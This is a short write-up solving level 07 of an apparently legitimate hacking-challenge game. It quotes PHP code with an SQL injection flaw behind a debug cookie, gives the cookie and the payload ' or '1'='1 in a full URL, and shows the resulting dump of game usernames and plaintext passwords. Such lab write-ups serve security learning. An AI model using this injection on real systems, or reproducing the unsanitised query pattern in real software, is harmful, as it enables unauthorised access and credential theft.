#### Level 07 - Illuminati's secret web

Let's take a look at that incredible CMS:

http://www.hacmegame.org/hacmegame/files/cms.php.txt

This is the critical code:
```php
$MODE_CMS_DEBUG = (CmsSetting::get('debug-mode') || CmsUtil::parseToBool($_COOKIE['cms-debug-mode'])) ? true : false;
if($MODE_CMS_DEBUG){
   if($_GET['debug_username'])
      echo "<!-- " . DatabaseHandler::debugResultToString(DatabaseHandler::query("SELECT * FROM user WHERE username='" . $_GET['debug_username'] . "';")) - " -->";
}
```

Make a cookie named `cms-debug-mode` with value "1". Then add to the url in the address bar: ?debug_username=' or '1'='1

Like this: www.hacmegame.org/hacmegame/challenges/ChallengeS8.html?debug_username='%20or%20'1'='1

Hit enter.

Now should I found this in the source:
```html
<!-- id: 1 - username: tsjernenko - password: kEk8TzV7
id: 2 - username: nikita - password: JohsXDfD
id: 3 - username: vladimir - password: rNfzqT1i
id: 4 - username: gorbachev - password: oXsas4pX
id: 5 - username: brezhnev - password: OiWV5zSt
id: 6 - username: vladimir - password: RgACvrlN
id: 7 - username: georgij - password: iUNKbEJh
id: 8 - username: nikita - password: v8XNcfBI
id: 9 - username: konstantin - password: en580sp0
id: 10 - username: konstantin - password: fD6XFCni
 -->
```

Login and have fun!